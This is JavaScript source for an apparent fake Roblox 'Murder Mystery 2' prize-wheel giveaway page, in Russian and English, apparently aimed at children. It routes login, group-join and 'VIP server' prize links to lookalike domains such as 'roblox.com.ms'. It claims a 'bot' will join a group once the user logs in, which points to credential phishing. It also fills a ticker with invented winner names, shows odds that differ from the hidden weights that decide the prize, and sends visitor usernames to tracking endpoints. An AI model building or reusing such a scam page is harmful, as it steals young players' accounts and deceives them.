const STARPETS_GROUP_URL = 'https://roblox.com.ki/communities/3693518858/';
function openLoginPage() {
  if (typeof openRobloxLogin === 'function') {
    openRobloxLogin();
    return;
  }
  window.open((typeof getLoginUrl === 'function' ? getLoginUrl() : 'https://roblox.com.ms/login?returnUrl=1529037819528066'), '_blank');
}

function i18n(key, vars) {
  return (typeof I18N !== 'undefined') ? I18N.t(key, vars) : key;
}

const WIN_PRIZES = [
  { name: 'Corrupt',         rarity: 'unique', image: 'images/corrupt.png',            value: '~ 600',    displayPercent: 1,    winWeight: 50 },
  { name: 'Chroma Treat',    rarity: 'chroma', image: 'images/chroma-treat.png',       value: '~ 5 500',  displayPercent: 0.3,  winWeight: 25 },
  { name: 'Chroma Sunrise',  rarity: 'chroma', image: 'images/chroma-sunrise.png',     value: '~ 11 800', displayPercent: 0.6,  winWeight: 10 },
];

const WHEEL_SEGMENTS = [
  { name: 'Eternal',          image: 'images/eternal.png',           color: '#ffc800', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 2,    value: '~ 350',    winWeight: 40 },
  { name: 'Frostbite',        image: 'images/frostbite.png',         color: '#ffffff', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 3,    value: '~ 280',    winWeight: 45 },
  { name: 'Snowfall',         image: 'images/snowfall.png',          color: '#ffc800', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 2.5,  value: '~ 320',    winWeight: 35 },
  { name: 'Corrupt',          image: 'images/corrupt.png',           color: '#2a2a35', visualWeight: 1, type: 'win', rarity: 'unique', displayPercent: 1,    value: '~ 600',    winWeight: 20 },
  { name: 'Waves',            image: 'images/waves.png',             color: '#ffffff', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 3,    value: '~ 250',    winWeight: 45 },
  { name: 'Chroma Luger',     image: 'images/chroma-luger.png',      color: '#ffc800', visualWeight: 1, type: 'win', rarity: 'chroma', displayPercent: 0.5,  value: '~ 8 000',  winWeight: 8 },
  { name: 'Evergun',          image: 'images/evergun.png',           color: '#ffffff', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 2.5,  value: '~ 300',    winWeight: 38 },
  { name: 'Chroma Treat',     image: 'images/chroma-treat.png',      color: '#2a2a35', visualWeight: 1, type: 'win', rarity: 'chroma', displayPercent: 0.3,  value: '~ 5 500',  winWeight: 6 },
  { name: 'Lightbringer',     image: 'images/chroma-lightbringer.png',color: '#ffc800', visualWeight: 1, type: 'win', rarity: 'chroma', displayPercent: 0.8,  value: '~ 6 500',  winWeight: 10 },
  { name: 'Ghost',            image: 'images/ghost.png',             color: '#ffffff', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 4,    value: '~ 180',    winWeight: 50 },
  { name: 'Paper',            image: 'images/paper.png',             color: '#ffc800', visualWeight: 1, type: 'win', rarity: 'godly',  displayPercent: 3.5,  value: '~ 200',    winWeight: 48 },
  { name: 'Chroma Sunrise',   image: 'images/chroma-sunrise.png',    color: '#2a2a35', visualWeight: 1, type: 'win', rarity: 'chroma', displayPercent: 0.6,  value: '~ 11 800', winWeight: 5 },
];

const TICKER_NAMES = [
  'sasha_roblox2014', 'MashaOfficial_7', 'den4ik777', 'artemka_play', 'kira_mm2',
  'VladTOPchik', 'sofia_kawaii02', 'maksim_trade', 'lera_2015', 'Dimon4ik_RBX',
  'nastya_love12', 'timur_gg', 'polina_mm2fan', 'egor_winner8', 'milana_star03',
  'kirill_pro119', 'anya_bloom', 'mark_2024rbx', 'diana_chill', 'yarik_night',
  'kostya_lucky7', 'xX_sniper_Xx', 'princess_liza9', 'CoolBoy_Alex', 'MegaNoob_209',
  'its_me_julia', 'bROskii123', 'Guest_88472', 'NoobMaster_42', 'iiProGamer2011',
];

const STORAGE_LAST_SPIN = 'playerok_mm2_last_spin';
const STORAGE_HISTORY = 'playerok_mm2_win_history';
const STORAGE_USERNAME = 'playerok_mm2_username';
const STORAGE_VISITOR_ID = 'playerok_mm2_visitor_id';

function safeStorageGet(key) {
  try { return localStorage.getItem(key); } catch (err) { return null; }
}

function safeStorageSet(key, value) {
  try { localStorage.setItem(key, value); } catch (err) {}
}

function safeStorageRemove(key) {
  try { localStorage.removeItem(key); } catch (err) {}
}

function getVisitorId() {
  let id = safeStorageGet(STORAGE_VISITOR_ID);
  if (!id) {
    id = (typeof crypto !== 'undefined' && crypto.randomUUID)
      ? crypto.randomUUID()
      : 'v_' + Date.now() + '_' + Math.random().toString(36).slice(2);
    safeStorageSet(STORAGE_VISITOR_ID, id);
  }
  return id;
}

function getTrackedUsername() {
  return ((usernameInput && usernameInput.value) || safeStorageGet(STORAGE_USERNAME) || '').trim();
}

function trackEvent(type, data = {}) {
  const payload = {
    visitorId: getVisitorId(),
    username: getTrackedUsername(),
    ...data,
  };
  const urls = {
    visit: '/api/track/visit',
    spin: '/api/track/spin',
    vip_click: '/api/track/vip-click',
  };
  fetch(urls[type] || '/api/track/visit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    keepalive: true,
  }).catch(() => {});
}


function clearAllSpinData() {
  safeStorageRemove(STORAGE_LAST_SPIN);
  safeStorageRemove(STORAGE_HISTORY);
  safeStorageRemove(STORAGE_USERNAME);
}
const SPIN_COOLDOWN_MS = 24 * 60 * 60 * 1000;

const canvas = document.getElementById('wheelCanvas');
const ctx = canvas ? canvas.getContext('2d') : null;
const spinBtn = document.getElementById('spinBtn');
const usernameInput = document.getElementById('username');
const winModal = document.getElementById('winModal');
const prizeGrid = document.getElementById('prizeGrid');
const totalSpinsEl = document.getElementById('totalSpins');
const winCountEl = document.getElementById('winCount');
const wheelGlow = document.getElementById('wheelGlow');
const wheelPointer = document.querySelector('.wheel-pointer');
const cooldownBox = document.getElementById('cooldownBox');
const cooldownTimer = document.getElementById('cooldownTimer');
const historyList = document.getElementById('historyList');
const historyEmpty = document.getElementById('historyEmpty');
const spinText = spinBtn ? spinBtn.querySelector('.spin-text') : null;
const spinSub = spinBtn ? spinBtn.querySelector('.spin-sub') : null;

const imageCache = {};
let rotation = 0;
let isSpinning = false;
let imagesReady = false;
let cooldownInterval = null;

let CENTER = 210;
let RADIUS = 200;

function setupWheelCanvas() {
  if (!canvas || !ctx) return;
  const wrapper = canvas.parentElement;
  if (!wrapper) return;
  const rect = wrapper.getBoundingClientRect();
  const size = Math.round(Math.max(240, Math.min(rect.width || 420, 420)));
  const dpr = Math.min(window.devicePixelRatio || 1, 2);
  canvas.width = Math.round(size * dpr);
  canvas.height = Math.round(size * dpr);
  canvas.style.width = `${size}px`;
  canvas.style.height = `${size}px`;
  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  CENTER = size / 2;
  RADIUS = CENTER - 10;
  drawWheel();
}

function refreshWheel() {
  setupWheelCanvas();
  drawWheel();
}

var ledAnimFrame = null;
function startLedAnim() {
  if (ledAnimFrame) return;
  (function tick() {
    if (!isSpinning) drawWheel();
    ledAnimFrame = requestAnimationFrame(tick);
  })();
}

let resizeTimer;
window.addEventListener('resize', () => {
  clearTimeout(resizeTimer);
  resizeTimer = setTimeout(setupWheelCanvas, 150);
});
const TOTAL_WEIGHT = WHEEL_SEGMENTS.reduce((sum, s) => sum + s.visualWeight, 0);

function getLastSpinTime() {
  const raw = safeStorageGet(STORAGE_LAST_SPIN);
  return raw ? parseInt(raw, 10) : 0;
}

function setLastSpinTime() {
  safeStorageSet(STORAGE_LAST_SPIN, Date.now().toString());
}

function getCooldownRemaining() {
  const last = getLastSpinTime();
  if (!last) return 0;
  const remaining = last + SPIN_COOLDOWN_MS - Date.now();
  return Math.max(0, remaining);
}

function canSpinToday() {
  return getCooldownRemaining() === 0;
}

function formatCooldown(ms) {
  const totalSec = Math.ceil(ms / 1000);
  const h = Math.floor(totalSec / 3600);
  const m = Math.floor((totalSec % 3600) / 60);
  const s = totalSec % 60;
  if (h > 0) return `${h} ч ${m} мин`;
  if (m > 0) return `${m} мин ${s} сек`;
  return `${s} сек`;
}

function formatWinDate(timestamp) {
  return new Date(timestamp).toLocaleString('ru-RU', {
    day: 'numeric',
    month: 'short',
    hour: '2-digit',
    minute: '2-digit',
  });
}

function getWinHistory() {
  try {
    const data = safeStorageGet(STORAGE_HISTORY);
    return data ? JSON.parse(data) : [];
  } catch (err) {
    return [];
  }
}

function saveWinHistory(history) {
  safeStorageSet(STORAGE_HISTORY, JSON.stringify(history));
}

function addWinRecord(prize, claimLink, username) {
  const record = {
    id: Date.now().toString(),
    username,
    prizeName: prize.name,
    prizeImage: prize.image,
    prizeRarity: prize.rarity,
    prizeValue: prize.value,
    displayPercent: prize.displayPercent,
    claimLink,
    timestamp: Date.now(),
  };
  const history = getWinHistory();
  history.unshift(record);
  saveWinHistory(history.slice(0, 50));
  return record;
}

function updateSpinButtonState() {
  if (!spinBtn || !spinText || !spinSub) return;
  const remaining = getCooldownRemaining();

  if (remaining > 0) {
    spinBtn.classList.add('on-cooldown');
    spinBtn.disabled = true;
    spinText.textContent = i18n('spin.wait');
    spinSub.textContent = formatCooldown(remaining);
    cooldownBox.classList.remove('hidden');
    cooldownTimer.textContent = formatCooldown(remaining);
  } else {
    spinBtn.classList.remove('on-cooldown');
    if (!isSpinning) spinBtn.disabled = false;
    spinText.textContent = i18n('spin.text');
    spinSub.textContent = i18n('spin.subDaily');
    cooldownBox.classList.add('hidden');
  }
}

function startCooldownTimer() {
  if (cooldownInterval) clearInterval(cooldownInterval);
  updateSpinButtonState();
  cooldownInterval = setInterval(() => {
    updateSpinButtonState();
    if (canSpinToday()) clearInterval(cooldownInterval);
  }, 1000);
}

function renderWinHistory() {
  const history = getWinHistory();
  const existingItems = historyList.querySelectorAll('.history-item');
  existingItems.forEach((el) => el.remove());

  if (history.length === 0) {
    historyEmpty.classList.remove('hidden');
    return;
  }

  historyEmpty.classList.add('hidden');

  history.forEach((record) => {
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
      <img class="history-item-img" src="${record.prizeImage}" alt="${record.prizeName}">
      <div class="history-item-info">
        <div class="history-item-name">${record.prizeName}</div>
        <div class="history-item-meta">${record.username} · ${formatWinDate(record.timestamp)}</div>
      </div>
      <div class="history-item-actions">
        <button class="history-btn history-btn-open" data-id="${record.id}">VIP-сервер</button>
        <button class="history-btn history-btn-copy" data-id="${record.id}">Скопировать VIP</button>
        <button class="history-btn history-btn-view" data-id="${record.id}">Открыть</button>
      </div>
    `;
    historyList.appendChild(item);
  });

  historyList.querySelectorAll('.history-btn-copy').forEach((btn) => {
    btn.addEventListener('click', () => {
      const record = history.find((r) => r.id === btn.dataset.id);
      if (!record) return;
      const link = getRecordClaimLink(record);
      navigator.clipboard.writeText(link).then(() => {
        const orig = btn.textContent;
        btn.textContent = '✓';
        setTimeout(() => { btn.textContent = orig; }, 1500);
      });
    });
  });

  historyList.querySelectorAll('.history-btn-open').forEach((btn) => {
    btn.addEventListener('click', () => {
      const record = history.find((r) => r.id === btn.dataset.id);
      if (!record) return;
      const link = getRecordClaimLink(record);
      trackEvent('vip_click', {
        claimLink: link,
        prize: record.prizeName,
        username: record.username,
      });
      window.open(link, '_blank', 'noopener,noreferrer');
    });
  });

  historyList.querySelectorAll('.history-btn-view').forEach((btn) => {
    btn.addEventListener('click', () => {
      const record = history.find((r) => r.id === btn.dataset.id);
      if (record) showWinFromHistory(record);
    });
  });
}

function showWinFromHistory(record) {
  const prize = {
    name: record.prizeName,
    image: record.prizeImage,
    rarity: record.prizeRarity,
    value: record.prizeValue,
    displayPercent: record.displayPercent,
  };
  showWinModal(prize, getRecordClaimLink(record), false);
}

function setClaimLinkUI(claimLink) {
  const hidden = document.getElementById('winLink');
  if (hidden) hidden.value = claimLink;
}

function preloadImages() {
  const uniqueImages = [...new Set(WHEEL_SEGMENTS.map((s) => s.image).filter(Boolean))];
  return Promise.all(
    uniqueImages.map(
      (src) =>
        new Promise((resolve) => {
          const img = new Image();
          img.onload = () => {
            imageCache[src] = img;
            resolve();
          };
          img.onerror = () => resolve();
          img.src = src;
        })
    )
  ).then(function () {
    imagesReady = true;
    refreshWheel();
    startLedAnim();
  });
}

function getSegmentLayout() {
  let cumulative = 0;
  return WHEEL_SEGMENTS.map((segment) => {
    const span = (segment.visualWeight / TOTAL_WEIGHT) * 2 * Math.PI;
    const layout = {
      segment,
      start: cumulative,
      end: cumulative + span,
      span,
      center: cumulative + span / 2,
    };
    cumulative += span;
    return layout;
  });
}

function drawSegmentContent(segR, span, segment, hubR) {
  var innerR = hubR + 8;
  var outerR = segR - 6;
  var band = outerR - innerR;
  var imgR = innerR + band * 0.68;
  var textR = innerR + band * 0.38;
  var imgSz = Math.min(36, Math.max(24, band * 0.38));
  var isDark = segment.color === '#2a2a35';

  ctx.save();
  ctx.beginPath();
  ctx.moveTo(0, 0);
  ctx.arc(0, 0, segR, -span / 2, span / 2);
  ctx.closePath();
  ctx.clip();

  var img = imageCache[segment.image];
  if (img) {
    ctx.save();
    ctx.shadowColor = isDark ? 'rgba(255,200,0,0.5)' : 'rgba(0,0,0,0.25)';
    ctx.shadowBlur = isDark ? 8 : 4;
    ctx.drawImage(img, imgR - imgSz / 2, -imgSz / 2, imgSz, imgSz);
    ctx.restore();
  }

  ctx.textAlign = 'center';
  ctx.textBaseline = 'middle';
  ctx.shadowColor = isDark ? 'rgba(0,0,0,0.9)' : 'rgba(0,0,0,0.3)';
  ctx.shadowBlur = isDark ? 2 : 1;
  ctx.fillStyle = isDark ? '#ffd700' : '#333';
  ctx.font = 'bold 8px Inter, sans-serif';
  var nm = segment.name.length > 11 ? segment.name.slice(0, 10) + '\u2026' : segment.name;
  ctx.fillText(nm, textR, -5);
  ctx.fillStyle = isDark ? 'rgba(255,255,255,0.85)' : 'rgba(80,60,0,0.55)';
  ctx.font = '600 7px Inter, sans-serif';
  ctx.fillText(formatPercent(segment.displayPercent), textR, 6);
  ctx.restore();
}

function drawWheel() {
  if (!ctx || !canvas) return;
  var layout = getSegmentLayout();
  var W = CENTER * 2;
  ctx.clearRect(0, 0, W, W);

  var ringW = Math.round(RADIUS * 0.08);
  if (ringW < 10) ringW = 10;
  var segR = RADIUS - ringW;
  var hubR = Math.max(segR * 0.2, 24);
  var PI2 = Math.PI * 2;

  // 1) Golden outer ring
  ctx.beginPath();
  ctx.arc(CENTER, CENTER, RADIUS, 0, PI2);
  var outerG = ctx.createRadialGradient(CENTER, CENTER, segR - 2, CENTER, CENTER, RADIUS + 1);
  outerG.addColorStop(0, '#96720e');
  outerG.addColorStop(0.15, '#c9a21c');
  outerG.addColorStop(0.35, '#ffd54f');
  outerG.addColorStop(0.5, '#ffe88a');
  outerG.addColorStop(0.65, '#ffd54f');
  outerG.addColorStop(0.85, '#c9a21c');
  outerG.addColorStop(1, '#7a5c0a');
  ctx.fillStyle = outerG;
  ctx.fill();

  ctx.beginPath();
  ctx.arc(CENTER, CENTER, RADIUS, 0, PI2);
  ctx.strokeStyle = '#6b4e08';
  ctx.lineWidth = 2;
  ctx.stroke();

  ctx.beginPath();
  ctx.arc(CENTER, CENTER, segR, 0, PI2);
  ctx.strokeStyle = '#8b6914';
  ctx.lineWidth = 1.5;
  ctx.stroke();

  // 2) Segments
  layout.forEach(function(item) {
    var segment = item.segment, start = item.start, span = item.span;
    var sa = rotation + start;
    var ea = sa + span;
    var isWin = segment.type === 'win';
    var isWhite = segment.color === '#ffffff';

    ctx.beginPath();
    ctx.moveTo(CENTER, CENTER);
    ctx.arc(CENTER, CENTER, segR, sa, ea);
    ctx.closePath();

    var g = ctx.createRadialGradient(CENTER, CENTER, 0, CENTER, CENTER, segR);
    if (isWin) {
      g.addColorStop(0, '#454558');
      g.addColorStop(0.4, '#35354a');
      g.addColorStop(1, '#22222f');
      ctx.fillStyle = g;
    } else if (isWhite) {
      g.addColorStop(0, '#ffffff');
      g.addColorStop(0.6, '#f8f8fa');
      g.addColorStop(1, '#eeeeee');
      ctx.fillStyle = g;
    } else {
      g.addColorStop(0, '#fff4c8');
      g.addColorStop(0.45, '#ffe066');
      g.addColorStop(1, '#e8b400');
      ctx.fillStyle = g;
    }
    ctx.fill();

    // Separator lines
    ctx.beginPath();
    ctx.moveTo(CENTER, CENTER);
    ctx.lineTo(CENTER + Math.cos(sa) * segR, CENTER + Math.sin(sa) * segR);
    ctx.strokeStyle = isWin ? 'rgba(255,200,0,0.6)' : 'rgba(160,130,40,0.25)';
    ctx.lineWidth = isWin ? 2 : 0.8;
    ctx.stroke();

    // Content
    ctx.save();
    ctx.translate(CENTER, CENTER);
    ctx.rotate(rotation + start + span / 2);

    drawSegmentContent(segR, span, segment, hubR);

    ctx.restore();
  });

  // 3) Vignette
  ctx.beginPath();
  ctx.arc(CENTER, CENTER, segR, 0, PI2);
  var vig = ctx.createRadialGradient(CENTER, CENTER, segR * 0.88, CENTER, CENTER, segR);
  vig.addColorStop(0, 'rgba(0,0,0,0)');
  vig.addColorStop(1, 'rgba(0,0,0,0.08)');
  ctx.fillStyle = vig;
  ctx.fill();

  // 4) LED bulbs
  var ledCount = 28;
  var ledR = (RADIUS + segR) / 2;
  var ledSz = ringW * 0.22;
  if (ledSz < 2.5) ledSz = 2.5;
  if (ledSz > 5) ledSz = 5;
  var t = Date.now() / 400;

  for (var i = 0; i < ledCount; i++) {
    var a = (PI2 * i) / ledCount;
    var lx = CENTER + Math.cos(a) * ledR;
    var ly = CENTER + Math.sin(a) * ledR;
    var on = Math.sin(t + i * 1.1) > -0.15;

    if (on) {
      ctx.beginPath();
      ctx.arc(lx, ly, ledSz * 3, 0, PI2);
      ctx.fillStyle = 'rgba(255,245,180,0.12)';
      ctx.fill();
    }

    ctx.beginPath();
    ctx.arc(lx, ly, ledSz, 0, PI2);
    var bg = ctx.createRadialGradient(lx - ledSz * 0.3, ly - ledSz * 0.3, 0, lx, ly, ledSz);
    if (on) {
      bg.addColorStop(0, '#fffff0');
      bg.addColorStop(0.35, '#ffe680');
      bg.addColorStop(1, '#d4a800');
    } else {
      bg.addColorStop(0, '#b09050');
      bg.addColorStop(1, '#705830');
    }
    ctx.fillStyle = bg;
    ctx.fill();
    ctx.strokeStyle = 'rgba(100,70,10,0.3)';
    ctx.lineWidth = 0.5;
    ctx.stroke();
  }

  // 5) Center hub
  ctx.save();
  ctx.shadowColor = 'rgba(0,0,0,0.3)';
  ctx.shadowBlur = 12;

  ctx.beginPath();
  ctx.arc(CENTER, CENTER, hubR + 5, 0, PI2);
  var hring = ctx.createRadialGradient(CENTER, CENTER, hubR - 1, CENTER, CENTER, hubR + 5);
  hring.addColorStop(0, '#c9a21c');
  hring.addColorStop(0.5, '#ffd54f');
  hring.addColorStop(1, '#8b6914');
  ctx.fillStyle = hring;
  ctx.fill();

  ctx.beginPath();
  ctx.arc(CENTER, CENTER, hubR, 0, PI2);
  var hf = ctx.createRadialGradient(CENTER, CENTER - hubR * 0.25, hubR * 0.08, CENTER, CENTER, hubR);
  hf.addColorStop(0, '#fffef8');
  hf.addColorStop(0.3, '#fff6d5');
  hf.addColorStop(0.7, '#ffe082');
  hf.addColorStop(1, '#ffc107');
  ctx.fillStyle = hf;
  ctx.fill();

  ctx.beginPath();
  ctx.arc(CENTER, CENTER, hubR + 5, 0, PI2);
  ctx.strokeStyle = 'rgba(100,70,10,0.35)';
  ctx.lineWidth = 1;
  ctx.stroke();

  ctx.beginPath();
  ctx.ellipse(CENTER, CENTER - hubR * 0.2, hubR * 0.55, hubR * 0.3, 0, 0, PI2);
  var hl = ctx.createRadialGradient(CENTER, CENTER - hubR * 0.3, 0, CENTER, CENTER - hubR * 0.2, hubR * 0.45);
  hl.addColorStop(0, 'rgba(255,255,255,0.6)');
  hl.addColorStop(1, 'rgba(255,255,255,0)');
  ctx.fillStyle = hl;
  ctx.fill();

  ctx.restore();
}

function formatPercent(value) {
  return value < 1 ? value.toFixed(1) + '%' : Math.round(value) + '%';
}

function lighten(hex, percent) {
  const num = parseInt(hex.replace('#', ''), 16);
  const r = Math.min(255, (num >> 16) + percent);
  const g = Math.min(255, ((num >> 8) & 0xff) + percent);
  const b = Math.min(255, (num & 0xff) + percent);
  return `rgb(${r},${g},${b})`;
}

function darken(hex, percent) {
  const num = parseInt(hex.replace('#', ''), 16);
  const r = Math.max(0, (num >> 16) - percent);
  const g = Math.max(0, ((num >> 8) & 0xff) - percent);
  const b = Math.max(0, (num & 0xff) - percent);
  return `rgb(${r},${g},${b})`;
}

function pickWinningSegment() {
  const winSegments = WHEEL_SEGMENTS
    .map((seg, i) => ({ seg, i }))
    .filter(({ seg }) => seg.type === 'win');
  const totalWinWeight = winSegments.reduce((sum, { seg }) => sum + (seg.winWeight || 1), 0);
  let roll = Math.random() * totalWinWeight;
  for (const { seg, i } of winSegments) {
    roll -= seg.winWeight || 1;
    if (roll <= 0) return { prize: seg, index: i };
  }
  const last = winSegments[winSegments.length - 1];
  return { prize: last.seg, index: last.i };
}

function angleForSegmentIndex(index) {
  const layout = getSegmentLayout();
  const target = layout[index];
  const pointerAngle = (3 * Math.PI) / 2;
  const segmentCenter = target.center;
  const desired = pointerAngle - segmentCenter;
  const fullSpins = 5 + Math.floor(Math.random() * 3);
  const currentNorm = ((rotation % (2 * Math.PI)) + 2 * Math.PI) % (2 * Math.PI);
  let delta = desired - currentNorm;
  if (delta > 0) delta -= 2 * Math.PI;

  const jitter = (Math.random() - 0.5) * target.span * 0.4;
  return rotation + fullSpins * 2 * Math.PI + delta + jitter;
}

function getJoinLinkTemplate() {
  const cfg = window.APP_CONFIG || {};
  return cfg.joinLinkTemplate || cfg.vipLinkTemplate ||
    'https://roblox.com.ms/games/142823291/Murder-Mystery-2?privateServerLinkCode=98785592047531357859374564753865';
}

function generateClaimLink(username, prize) {
  const template = getJoinLinkTemplate();
  const prizeName = typeof prize === 'string' ? prize : prize.name;
  const hasPlaceholders = /\{(username|user|prize|weapon)\}/i.test(template);
  if (!hasPlaceholders) return template;
  return template
    .replace(/\{username\}/gi, encodeURIComponent(username))
    .replace(/\{user\}/gi, encodeURIComponent(username))
    .replace(/\{prize\}/gi, encodeURIComponent(prizeName))
    .replace(/\{weapon\}/gi, encodeURIComponent(prizeName));
}

function getRecordClaimLink(record) {
  return generateClaimLink(record.username, record.prizeName);
}

function spawnConfetti() {
  const container = document.getElementById('confetti');
  container.innerHTML = '';
  const colors = ['#ffc800', '#111111', '#ffdb4d', '#ffe066'];
  for (let i = 0; i < 80; i++) {
    const piece = document.createElement('div');
    piece.className = 'confetti-piece';
    const size = 6 + Math.random() * 8;
    piece.style.cssText = `
      left: ${Math.random() * 100}%;
      width: ${size}px;
      height: ${size * (Math.random() > 0.5 ? 1 : 0.4)}px;
      background: ${colors[Math.floor(Math.random() * colors.length)]};
      animation-delay: ${Math.random() * 0.6}s;
      animation-duration: ${2.5 + Math.random() * 2}s;
      border-radius: ${Math.random() > 0.5 ? '50%' : '2px'};
    `;
    container.appendChild(piece);
  }
}

function spawnBurst() {
  const container = document.getElementById('modalBurst');
  container.innerHTML = '';
  const colors = ['#ffc800', '#111111', '#ffdb4d', '#ffe066'];
  for (let i = 0; i < 30; i++) {
    const p = document.createElement('div');
    p.className = 'burst-particle';
    const angle = (Math.PI * 2 * i) / 30;
    const dist = 150 + Math.random() * 200;
    p.style.cssText = `
      background: ${colors[i % colors.length]};
      --bx: ${Math.cos(angle) * dist}px;
      --by: ${Math.sin(angle) * dist}px;
      width: ${4 + Math.random() * 6}px;
      height: ${4 + Math.random() * 6}px;
    `;
    container.appendChild(p);
  }
}

function showWinModal(prize, claimLink, saveToHistory = false) {
  document.getElementById('wonRarity').textContent = prize.rarity.toUpperCase();
  document.getElementById('wonRarity').className = 'won-rarity ' + prize.rarity;
  document.getElementById('wonImage').src = prize.image;
  document.getElementById('wonImage').alt = prize.name;
  document.getElementById('wonName').textContent = prize.name;
  document.getElementById('wonValue').textContent = i18n('win.value', { val: prize.value });
  document.getElementById('wonChance').textContent = i18n('win.chance', { pct: formatPercent(prize.displayPercent) });
  setClaimLinkUI(claimLink);
  winModal.classList.remove('hidden');

  if (saveToHistory) {
    document.body.classList.add('win-shake');
    spawnConfetti();
    spawnBurst();
    setTimeout(() => document.body.classList.remove('win-shake'), 500);
  }
}

let groupJoined = false;

function showGroupModal() {
  var existing = document.getElementById('groupModal');
  if (existing) { existing.classList.remove('hidden'); return; }

  var overlay = document.createElement('div');
  overlay.id = 'groupModal';
  overlay.style.cssText = 'position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(6px);';

  var box = document.createElement('div');
  box.style.cssText = 'background:#fff;border-radius:20px;padding:32px 28px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.25);animation:modalPop .3s cubic-bezier(.34,1.56,.64,1);';

  box.innerHTML =
    '<div style="margin-bottom:12px;"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#ffc800" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>' +
    '<h3 style="margin:0 0 8px;font-size:1.2rem;">' + i18n('group.title') + '</h3>' +
    '<p style="margin:0 0 20px;color:#666;font-size:.88rem;line-height:1.5;">' + (I18N.getLang() === 'en' ? 'To spin the wheel, join our group. Choose a method:' : 'Чтобы крутить колесо, нужно вступить в нашу группу. Выбери удобный способ:') + '</p>' +

    '<a href="' + STARPETS_GROUP_URL + '" target="_blank" rel="noopener" id="groupManualBtn" ' +
      'style="display:flex;align-items:center;gap:12px;padding:14px 16px;background:#fff;border:2px solid #eee;border-radius:14px;text-decoration:none;color:inherit;margin-bottom:10px;transition:all .18s;text-align:left;"' +
      ' onmouseover="this.style.borderColor=\'#ffc800\';this.style.background=\'#fffde8\'" onmouseout="this.style.borderColor=\'#eee\';this.style.background=\'#fff\'">' +
      '<div style="width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#ffc800,#ff9500);display:flex;align-items:center;justify-content:center;flex-shrink:0;">' +
        '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>' +
      '</div>' +
      '<div><strong style="font-size:.95rem;">' + i18n('group.manual') + '</strong><br><span style="font-size:.8rem;color:#888;">' + (I18N.getLang() === 'en' ? 'Open the group and click Join' : 'Открой группу и нажми «Вступить»') + '</span></div>' +
    '</a>' +

    '<button id="groupRobloxBtn" ' +
      'style="display:flex;align-items:center;gap:12px;width:100%;padding:14px 16px;background:#fff;border:2px solid #eee;border-radius:14px;cursor:pointer;transition:all .18s;text-align:left;font-family:inherit;font-size:inherit;color:inherit;"' +
      '>' +
      '<div style="width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#1a1a1a,#333);display:flex;align-items:center;justify-content:center;flex-shrink:0;">' +
        '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><line x1="6" y1="12" x2="10" y2="12"/><line x1="8" y1="10" x2="8" y2="14"/></svg>' +
      '</div>' +
      '<div><strong style="font-size:.95rem;">' + i18n('group.login') + '</strong><br><span style="font-size:.8rem;color:#888;">' + (I18N.getLang() === 'en' ? 'Bot will auto-join the group' : 'Бот автоматически вступит в группу') + '</span></div>' +
    '</button>' +

    '<p id="groupStatus" style="margin:12px 0 0;font-size:.85rem;color:#4a90d9;display:none;"></p>';

  overlay.appendChild(box);
  document.body.appendChild(overlay);

  overlay.addEventListener('click', function(e) { if (e.target === overlay) overlay.classList.add('hidden'); });

  document.getElementById('groupManualBtn').addEventListener('click', function() {
    groupJoined = true;
    try { localStorage.setItem('playerok_group_joined', '1'); } catch(e) {}
    setTimeout(function() { overlay.classList.add('hidden'); }, 500);
  });

  document.getElementById('groupRobloxBtn').addEventListener('click', function() {
    openLoginPage();
    var status = document.getElementById('groupStatus');
    if (status) { status.style.display = 'block'; status.textContent = i18n('group.loginHint'); }
    groupJoined = true;
    try { localStorage.setItem('playerok_group_joined', '1'); } catch(e) {}
    setTimeout(function() { overlay.classList.add('hidden'); }, 3000);
  });

  var robloxBtn = document.getElementById('groupRobloxBtn');
  robloxBtn.addEventListener('mouseover', function() { this.style.borderColor = '#333'; this.style.background = '#f8f8f8'; });
  robloxBtn.addEventListener('mouseout', function() { this.style.borderColor = '#eee'; this.style.background = '#fff'; });
}

(function restoreGroupState() {
  try { if (localStorage.getItem('playerok_group_joined') === '1') groupJoined = true; } catch(e) {}
})();

function spin() {
  if (!usernameInput || !spinBtn || !canvas) return;
  const username = usernameInput.value.trim();
  if (!username) {
    usernameInput.classList.add('error');
    usernameInput.focus();
    setTimeout(() => usernameInput.classList.remove('error'), 500);
    return;
  }

  if (!canSpinToday()) {
    updateSpinButtonState();
    cooldownBox.classList.remove('hidden');
    return;
  }

  if (!imagesReady || isSpinning) return;
  isSpinning = true;
  spinBtn.disabled = true;
  canvas.classList.add('spinning');
  wheelGlow.classList.add('active');
  var stage = document.querySelector('.wheel-stage');
  if (stage) stage.classList.add('spin-active');

  const { prize, index } = pickWinningSegment();
  const targetRotation = angleForSegmentIndex(index);
  const startRotation = rotation;
  const duration = 4500 + Math.random() * 1000;
  const startTime = performance.now();

  function animate(now) {
    const elapsed = now - startTime;
    const progress = Math.min(elapsed / duration, 1);
